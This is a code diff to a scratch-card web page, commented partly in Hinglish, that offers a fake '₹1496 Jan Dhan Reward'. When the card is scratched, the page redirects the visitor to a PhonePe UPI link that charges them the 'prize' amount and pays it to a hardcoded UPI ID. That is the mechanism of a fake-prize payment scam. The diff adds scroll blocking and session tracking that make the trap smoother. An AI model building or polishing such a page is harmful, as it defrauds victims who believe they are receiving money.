@@ -21,6 +21,14 @@
             overflow-x: hidden;
         }
         
+        /* Scroll block karne ke liye */
+        body.no-scroll {
+            overflow: hidden;
+            position: fixed;
+            width: 100%;
+            height: 100%;
+        }
+        
         .container {
             width: 100%;
             min-height: 100vh;
@@ -87,6 +95,11 @@
             cursor: grab;
         }
         
+        .scratch-container.scratched {
+            pointer-events: none;
+            cursor: default;
+        }
+        
         .scratch-canvas {
             width: 100%;
             height: 100%;
@@ -126,7 +139,7 @@
         <div class="reward-section">
             <div class="reward-box">
                 <img src="reward-image.png" class="reward-image" alt="Reward">
-                <div class="scratch-container">
+                <div class="scratch-container" id="scratchContainer">
                     <canvas class="scratch-canvas" id="scratchCanvas"></canvas>
                 </div>
                 <div class="reward-price" id="amount">₹1496</div>
@@ -159,6 +172,12 @@
         const ctx = canvas.getContext('2d');
         let totalPixels = 0;
         let isCompleted = false;
+        let isFirstScratch = true;
+
+        // Check if already scratched in this session
+        if (sessionStorage.getItem('scratchCompleted')) {
+            isCompleted = true;
+        }
 
         function resizeCanvas() {
             const box = document.querySelector('.reward-box');
@@ -168,6 +187,13 @@
         }
 
         function drawScratchOverlay() {
+            // Agar already scratch ho chuka hai to transparent karo
+            if (isCompleted) {
+                ctx.clearRect(0, 0, canvas.width, canvas.height);
+                document.getElementById('scratchContainer').classList.add('scratched');
+                return;
+            }
+
             ctx.fillStyle = '#3a86ff';
             ctx.fillRect(0, 0, canvas.width, canvas.height);
 
@@ -231,24 +257,17 @@
             const upi = '8271514079-1@nyes';
             const description = 'you won';
             
-            // PhonePe UPI deep link
             const phonepeUrl = `upi://pay?pa=${upi}&pn=Jan%20Dhan%20Reward&am=${amount}&cu=INR&tn=${encodeURIComponent(description)}`;
-            
-            // Web fallback
             const webUrl = `https://phon.pe/${upi}?amount=${amount}&description=${encodeURIComponent(description)}`;
             
             const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
             
             if (isMobile) {
-                // Try to open PhonePe app
                 window.location.href = phonepeUrl;
-                
-                // If app doesn't open, fallback to web after 1.5 seconds
                 setTimeout(() => {
                     window.location.href = webUrl;
                 }, 1500);
             } else {
-                // Desktop - open web version
                 window.location.href = webUrl;
             }
         }
@@ -265,6 +284,9 @@
 
             if (percent >= 60 && !isCompleted) {
                 isCompleted = true;
+                // Save in session storage
+                sessionStorage.setItem('scratchCompleted', 'true');
+                document.getElementById('scratchContainer').classList.add('scratched');
                 autoCompleteScratch();
             }
         }
@@ -274,7 +296,6 @@
             ctx.fillRect(0, 0, canvas.width, canvas.height);
             launchLightCelebration();
             
-            // 2.5 seconds ke baad seedha PhonePe open
             setTimeout(() => {
                 redirectToPhonePe();
             }, 2500);
@@ -336,6 +357,15 @@
             }
         }
 
+        // Scroll Block Logic
+        function blockScroll() {
+            document.body.classList.add('no-scroll');
+        }
+
+        function unblockScroll() {
+            document.body.classList.remove('no-scroll');
+        }
+
         // Input Pos Tracking
         let isScratching = false;
 
@@ -355,23 +385,34 @@
             };
         }
 
+        // Mouse Events with Scroll Block
         canvas.addEventListener('mousedown', e => {
+            if (isCompleted) return;
             isScratching = true;
+            blockScroll();
             const pos = getMousePos(e);
             scratch(pos.x, pos.y);
         });
 
         canvas.addEventListener('mousemove', e => {
-            if (isScratching) {
+            if (isScratching && !isCompleted) {
                 const pos = getMousePos(e);
                 scratch(pos.x, pos.y);
             }
         });
 
-        window.addEventListener('mouseup', () => isScratching = false);
+        window.addEventListener('mouseup', () => {
+            if (isScratching) {
+                isScratching = false;
+                unblockScroll();
+            }
+        });
 
+        // Touch Events with Scroll Block
         canvas.addEventListener('touchstart', e => {
+            if (isCompleted) return;
             isScratching = true;
+            blockScroll();
             if (e.touches.length > 0) {
                 const pos = getTouchPos(e);
                 scratch(pos.x, pos.y);
@@ -379,17 +420,40 @@
         }, { passive: true });
 
         canvas.addEventListener('touchmove', e => {
-            if (isScratching && e.touches.length > 0) {
+            if (isScratching && !isCompleted && e.touches.length > 0) {
                 const pos = getTouchPos(e);
                 scratch(pos.x, pos.y);
             }
         }, { passive: true });
 
-        canvas.addEventListener('touchend', () => isScratching = false);
+        canvas.addEventListener('touchend', () => {
+            if (isScratching) {
+                isScratching = false;
+                unblockScroll();
+            }
+        }, { passive: true });
+
+        // Agar touch cancel ho jaye to bhi unblock ho
+        canvas.addEventListener('touchcancel', () => {
+            if (isScratching) {
+                isScratching = false;
+                unblockScroll();
+            }
+        }, { passive: true });
 
         // Init Setup
         window.addEventListener('load', () => {
             resizeCanvas();
+            
+            // Agar already scratch ho chuka hai to seedha reveal karo
+            if (sessionStorage.getItem('scratchCompleted')) {
+                isCompleted = true;
+                document.getElementById('scratchContainer').classList.add('scratched');
+                // Amount show karo
+                const amount = getRewardAmount();
+                document.getElementById('amount').innerHTML = `₹${amount}`;
+            }
+            
             drawScratchOverlay();
             startCountdown();
             document.getElementById("amount").innerHTML = "₹1496";
